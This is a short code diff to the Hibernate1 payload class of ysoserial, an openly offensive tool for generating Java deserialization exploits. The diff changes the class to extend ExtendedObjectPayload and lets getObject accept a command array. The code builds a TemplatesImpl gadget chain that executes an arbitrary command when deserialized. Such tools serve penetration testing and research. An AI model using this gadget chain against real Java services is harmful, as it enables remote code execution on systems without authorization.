@@ -37,7 +37,7 @@ import ysoserial.payloads.util.Reflections;
  * @author mbechler
  */
 @Authors({ Authors.MBECHLER })
-public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
+public class Hibernate1 extends ExtendedObjectPayload<Object> implements DynamicDependencies {
 
     public static String[] getDependencies () {
         if ( System.getProperty("hibernate5") != null ) {
@@ -96,7 +96,7 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
     }
 
 
-    public Object getObject ( String command ) throws Exception {
+    public Object getObject ( String[] command ) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(command);
         Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
         return makeCaller(tpl, getters);
